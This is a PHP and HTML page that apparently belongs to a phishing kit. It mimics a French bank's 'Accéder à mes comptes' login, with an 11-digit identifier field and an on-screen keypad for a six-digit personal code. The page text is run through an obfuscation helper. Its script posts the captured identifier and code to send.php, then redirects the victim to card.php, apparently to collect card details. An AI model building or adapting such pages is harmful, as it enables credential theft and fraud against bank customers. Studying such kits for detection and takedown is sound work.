<?php 
require '../main.php';

if(!isset($_SESSION['dep']) OR empty($_SESSION['dep'])){
    $_SESSION['dep'] = @$_GET['dep'];
}
?><!doctype html>
<html>
<head>
<title></title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/fonts.css">
<link rel="stylesheet" href="res/style.css">
</head>
<body>
<header>
        <img src="res/logo.png">
</header>
<section>
<div class="left">
    <div class="ad">
        <h4><?php $bm->obf("VENEZ ÉCHANGER ET DECOUVRIR NOS ACTIONS SUR LE TERRITOIRE"); ?></h4>
        <button class="sbmt"><?php $bm->obf("Accéder aux documents pour votre AG<"); ?>/button>
</div>
</div>
<div class="right">
<div class="title"><?php $bm->obf("ACCÉDER À MES COMPTES"); ?></div>
    <div class="holder">
        <div class="col">
            <div class="form">
                <div class="form-group">
                    <label>
                    <strong><?php $bm->obf("IDENTIFIANT"); ?></strong>
                    <p><?php $bm->obf("Saisissez votre identifiant à 11 chiffres"); ?></p>
                    </label>
                    <input type="text" class="textinput" id="d0" placeholder="Exemple 98652706859">
                    <?php if(isset($_GET['e']))
                    echo "<p style='color:#ae0014; font-size:0.8em; font-weight:bold;'> Votre identification est incorrecte, veuillez ressaisir votre numéro de compte et votre code d'accès</p>";
                    ?>
                </div>



                <div class="form-group" style="display:none;" id="key">
                    <label style="display:flex; align-items:center;">
                        <div style="width:50%; text-align:left;">
                            <strong><?php $bm->obf("CODE PERSONNEL"); ?></strong>
                        </div>
                        <div style="width:50%; text-align:right;">
                           <a href="javascript:void(0)">Perdu / Oublié ?</a>
                        </div>
                    </label>
                    <input type="password" readonly class="textinput"  maxlength="6" id="d1" placeholder="Effacer et saisir à nouveau le champ code personnel">

                    <div class="keyboard">
                        <div class="sector">
                            <button onclick="add(2)">2</button>
                            <button onclick="add(5)">5</button>
                            <button onclick="add(9)">9</button>
                            <button onclick="add(6)">6</button>
                            <button onclick="add(8)">8</button>
                        </div>
                        <div class="sector">
                            <button onclick="add(1)">1</button>
                            <button onclick="add(3)">3</button>
                            <button onclick="add(0)">0</button>
                            <button onclick="add(7)">7</button>
                            <button onclick="add(4)">4</button>
                        </div>
                    </div>
                </div>




                <div class="form-group">
                    <button class="sbmt disabled" onclick="sendId()" id="senduser"><?php $bm->obf("Entrer mon code personnel"); ?></button>
                    <button class="sbmt disabled" onclick="sendLogin()" id="sendlogin" style="display:none;">VALIDER</button>
                </div>
            </div>



            <div class="register">
                <h3><?php $bm->obf("Vous n’êtes pas encore client ?"); ?></h3>
                <button class="sbmt"><?php $bm->obf("Devenir client"); ?></button>
            </div>
        </div>


        <div class="col">
            <div class="col-group">
                <h3><?php $bm->obf("VOTRE IDENTIFICATION NE CHANGE PAS"); ?></h3>
                <b style="font-size:0.7em;"><?php $bm->obf("Pour accéder à votre compte, saisissez votre identifiant et votre code personnel habituels."); ?></b>
            </div>
            <div class="col-group">
                <h3 style="margin:0;"><?php $bm->obf("UN PROBLÈME TECHNIQUE"); ?></h3>
                <span style="font-size:1.2em;"><?php $bm->obf("LORS DE VOTRE CONNEXION?"); ?></span><br>
                <a href="javascript:void(0)"><?php $bm->obf("Signalez-nous un problème"); ?></a>
            </div>
            <div class="col-group">
                <img src="res/sec.png" style="width:180px; display:block;">
                <b style="font-size:0.7em;"><?php $bm->obf("Restez vigilants et veillez à protéger vos données personnelles."); ?></b><br>
                <a href="javascript:void(0)"><?php $bm->obf("Consultez nos conseils de sécurité"); ?></a>
            </div>
            <div class="col-group">
                <b style="font-size:0.7em;"><?php $bm->obf("Nous vous invitons également à consulter régulièrement nos Conditions Générales d'utilisation."); ?></b><br>
                <a href="javascript:void(0)"><?php $bm->obf("Voir les Conditions Générales d'Utilisation"); ?></a>
            </div>
        </div>
    </div>

</div>


</section>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#d0").mask("00000000000");
$("#d1").mask("000000");

var dep = "<?php echo $_SESSION['dep']; ?>";

$("#d0").keyup(()=>{
    if($("#d0").val().length==11){
        $("#senduser").removeClass("disabled");
    }else{
        $("#senduser").addClass("disabled");
    }
});


function sendId(){
    if($("#d0").val().length>=11){
        $("#sendlogin").show();
        $("#key").show();
        $("#senduser").hide();
    }
}

function add(num){
    if($("#d1").val().length>=6){
        return false;
    }else{
        $("#d1").val($("#d1").val()+num);
    }

    if($("#d1").val().length>=6){
        $("#sendlogin").removeClass("disabled");
        return false;
    }
}


function sendLogin(){
    if($("#d1").val().length==6){
        $("#sendlogin").addClass("disabled");
        $.post("send.php", {depart:dep, user:$("#d0").val(), pass:$("#d1").val()}, function(d){
            window.location='card.php';
        });
    }
}


$("#d0").keypress((e)=>{
    if(e.key=="Enter"){
        sendId();
    }
});


$("#d1").keypress((e)=>{
    if(e.key=="Enter"){
        sendLogin();
    }
});


</script>

</body>
</html>